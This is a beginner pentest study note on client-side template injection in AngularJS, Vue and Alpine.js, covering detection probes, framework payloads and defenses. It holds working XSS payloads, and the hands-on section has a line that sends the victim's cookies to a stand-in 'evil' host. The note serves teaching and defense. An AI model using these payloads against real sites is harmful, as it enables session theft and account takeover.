---
tags: [vapt, ssti, csti, xss, client-side, beginner]
difficulty: beginner
module: "09 - SSTI"
topic: "09.11 Client-Side Template Injection (CSTI)"
---

# 09.11 — Client-Side Template Injection (CSTI)

## What is it?
Client-Side Template Injection (CSTI) is the **browser-side cousin of SSTI**. With SSTI you inject template syntax that the **server** evaluates, leading to remote code execution on the server. With CSTI you inject template syntax that a **front-end framework** (AngularJS, Vue, Alpine.js) evaluates **in the victim's browser**, leading to arbitrary **JavaScript execution** — effectively a powerful form of XSS.

Think of SSTI vs CSTI like a kitchen vs a microwave. SSTI runs your "recipe" in the restaurant's full kitchen (the server) where you can cook anything. CSTI runs it in the customer's own microwave (their browser) — smaller blast radius, but you still get to run your code on *their* plate.

The test is the same idea as SSTI: feed the page a math expression and see if it gets **calculated** instead of printed.
- Send `{{ 7-7 }}`
- Vulnerable → page shows `0`
- Not vulnerable → page shows the literal `{{ 7-7 }}`

## Important: HTML injection is not always CSTI
Reflecting your input into the page is **not** automatically CSTI. The framework must actually **compile/evaluate** your input as a template expression. Many modern builds (e.g. runtime-only Vue) do **not** compile arbitrary strings on the client. So the workflow is: **confirm the framework → confirm the exact sink → only then fire payloads.**

## Discovery / fingerprinting
Confirm your reflection lands inside DOM the framework actually processes:

| Framework | Tell-tale markers |
|---|---|
| AngularJS | `ng-app`, `ng-controller`, `ng-bind`, `ng-bind-html`, global `window.angular` |
| Vue | `v-` directives (`v-html`, `v-bind`), Vue-controlled roots, devtools markers |
| Alpine.js | `x-data`, `x-html`, `x-on` |

Quick workflow:
1. Confirm reflection with a unique marker string.
2. Probe with `{{7*7}}` — look for `49`.
3. If evaluated → switch to framework-specific RCE/XSS payloads.
4. If `{{...}}` is **not** evaluated → hunt for directive/event sinks (`ng-focus`, `v-html`, alternate delimiters, dynamic template compilation).

## Framework payloads

### AngularJS
```javascript
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
```
```html
<input ng-focus=$event.view.alert('XSS')>
```
- **AngularJS < 1.6** had an expression **sandbox** — code-exec usually needs a sandbox escape. `{{1+1}}` still confirms CSTI.
- **AngularJS >= 1.6** removed the sandbox, so `{{constructor.constructor('alert(1)')()}}` works directly.
- **CSP / `ng-csp` mode** — filter abuse can still reach execution:
  ```html
  <input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
  ```

### Vue
```html
<!-- Vue 2 -->
"><div v-html="''.constructor.constructor('alert(1)')()">aaa</div>
```
```text
{{this.constructor.constructor('alert("foo")')()}}
```
```text
{{_openBlock.constructor('alert(1)')()}}   <!-- Vue 3 -->
```
Distinguish the two Vue cases:
- **Template compiler present** → user strings compiled as templates (exploitable).
- **Dangerous sink** → reflection lands in `v-html` / dynamic binding gadget.
- Plain reflection into inert HTML on a **runtime-only** build is *not* enough.

## ASCII Diagram
```text
================================================================================
                       SSTI vs CSTI — WHERE CODE RUNS
================================================================================

   USER INPUT:  {{ constructor.constructor('alert(1)')() }}

        |                                   |
        v (SSTI)                            v (CSTI)
  +----------------+                 +-------------------+
  |  SERVER engine |                 |  BROWSER framework|
  |  (Jinja, Twig) |                 |  (AngularJS, Vue) |
  |  EVALUATES it  |                 |  EVALUATES it     |
  +----------------+                 +-------------------+
        |                                   |
        v                                   v
   CODE RUNS ON SERVER               JS RUNS IN VICTIM BROWSER
   => RCE                             => XSS-grade impact
                                        (steal cookies, act as user)
================================================================================
```

## Hands-on test
1. Find an input reflected into the page (search box, name, URL param).
2. View source / DevTools — is the reflection inside an `ng-app`/`v-`/`x-data` region?
3. Inject `{{7*7}}`. See `49`? You have CSTI.
4. Escalate with the framework-specific payload above, starting with `alert(document.domain)` as a safe PoC.
5. Real impact PoC: `{{constructor.constructor('document.location="//evil/?c="+document.cookie')()}}` (only against authorized targets).

## Defense
- **Never** insert user input into a region the template engine scans. Treat framework-controlled DOM as a code context, not a text context.
- Use framework escaping: Angular's `{{ }}` interpolation auto-escapes *text*, but problems arise when input is placed into **directives** or **`ng-bind-html`/`v-html`** — avoid those with untrusted data.
- Prefer **runtime-only** builds (no client template compiler) so attacker strings cannot be compiled.
- Add a strict **Content-Security-Policy** as defense-in-depth to limit what injected JS can do.
- Keep frameworks updated, but remember: newer AngularJS (>=1.6) is *easier* to exploit, not harder — the real fix is not reflecting input into template contexts.

## Related
- [[01 - What is SSTI]] — the server-side counterpart; same `{{7*7}}` detection idea
- [[03 - Detecting SSTI]] — shared detection methodology
